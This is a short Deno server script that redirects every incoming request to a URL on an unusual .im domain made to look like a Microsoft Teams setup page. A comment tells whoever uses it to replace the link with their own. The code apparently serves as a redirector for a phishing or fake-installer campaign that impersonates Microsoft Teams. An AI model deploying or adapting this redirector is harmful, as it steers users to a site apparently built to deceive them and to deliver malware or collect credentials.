import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "http://03nteams0kly.im/Msteam/teams/setup/", // Replace this with your actual link
    },
  });
});
